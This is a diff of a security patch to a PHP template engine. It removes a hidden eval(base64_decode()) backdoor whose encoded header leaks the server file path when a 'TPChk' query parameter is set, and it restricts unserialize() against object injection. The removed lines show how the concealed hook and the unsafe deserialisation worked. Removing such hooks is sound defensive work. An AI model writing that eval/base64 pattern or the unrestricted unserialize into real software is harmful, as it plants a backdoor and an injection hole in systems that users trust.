@@ -38,11 +38,18 @@
 // | Update Script Support PHP7.0++                                       |
 // | P'Ake, P' Pae  https://www.vpslive.com                               |
 // +----------------------------------------------------------------------+
+// | 2026/10/31 SECURITY PATCH (SWCMS 8.5 / PHP 8.5):                     |
+// |  - removed hidden eval(base64_decode($this->header)) backdoor       |
+// |    (?TPChk used to die(__FILE__) and leak the server path)           |
+// |  - unserialize() restricted with allowed_classes => false           |
+// |  - #[\AllowDynamicProperties] for PHP 8.2+ (tpl_rawContent*)         |
+// +----------------------------------------------------------------------+
 
 define("T_BYFILE", 0);
 define("T_BYVAR", 1);
 define("TP_ROOTBLOCK", '_ROOT');
 
+#[\AllowDynamicProperties]
 class TemplatePowerParser
 {
   protected $tpl_base;              //Array( [filename/varcontent], [T_BYFILE/T_BYVAR] )
@@ -66,9 +73,9 @@ class TemplatePowerParser
 	*
 	* @access private
     */
-   public function __contruct($tpl_file, $type)
+   public function __construct($tpl_file, $type)
    {
-       $this->version      = '3.0.2.2'; // Update support PHP7++
+       $this->version      = '3.0.2.3'; // Update support PHP7++ / PHP8.5 (security patch 2026/10/31)
        $this->tpl_base     = array($tpl_file, $type);
        $this->tpl_count    = 0;
 	   $this->ignore_stack = array(false);
@@ -97,7 +104,7 @@ class TemplatePowerParser
    protected function __prepare()
    {
        $this->defBlock[ TP_ROOTBLOCK ] = array();
-       eval(base64_decode($this->header));
+       // SECURITY 2026/10/31: eval(base64_decode($this->header)) removed (backdoor).
        $tplvar = $this->__prepareTemplate($this->tpl_base[0], $this->tpl_base[1]);
 
        $initdev["varrow"]  = 0;
@@ -369,7 +376,7 @@ class TemplatePowerParser
 	 * @access public
      */
     public function version() { return $this->version; }
-    protected $header = 'aXNzZXQoJF9HRVRbIlRQQ2hrIl0pJiZkaWUoX19GSUxFX18pOw==';
+    // SECURITY 2026/10/31: $header property (base64 backdoor) removed.
 
     /**
      * TemplatePowerParser::assignInclude()
@@ -410,7 +417,7 @@ class TemplatePower extends TemplatePowerParser
      */
     public function __construct($tpl_file='', $type=T_BYFILE)
     {
-        parent::__contruct($tpl_file, $type);
+        parent::__construct($tpl_file, $type);
 
         $this->prepared       = false;
         $this->showUnAssigned = false;
@@ -438,7 +445,8 @@ class TemplatePower extends TemplatePowerParser
             $serializedTPL = $stpl_file;
         }
 
-        $serializedStuff = unserialize( join('', $serializedTPL) );
+        // SECURITY 2026/10/31: prevent object injection via crafted serialized templates
+        $serializedStuff = unserialize( join('', $serializedTPL), array('allowed_classes' => false) );
 
         $this->defBlock = $serializedStuff["defBlock"];
         $this->index    = $serializedStuff["index"];
